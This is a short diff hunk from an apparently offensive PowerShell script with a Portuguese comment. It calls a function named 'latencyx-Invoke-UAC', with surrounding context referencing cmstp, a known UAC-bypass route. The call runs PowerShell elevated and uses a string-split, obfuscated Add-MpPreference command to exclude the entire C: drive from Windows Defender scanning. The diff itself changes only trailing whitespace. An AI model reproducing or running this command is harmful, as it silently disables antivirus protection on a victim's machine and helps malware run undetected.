@@ -191,4 +191,4 @@ if ($latencyxProcess -eq "cmstp") {
 }
 
 # Agora fora da função, você pode chamar diretamente a função com o comando desejado:
-latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
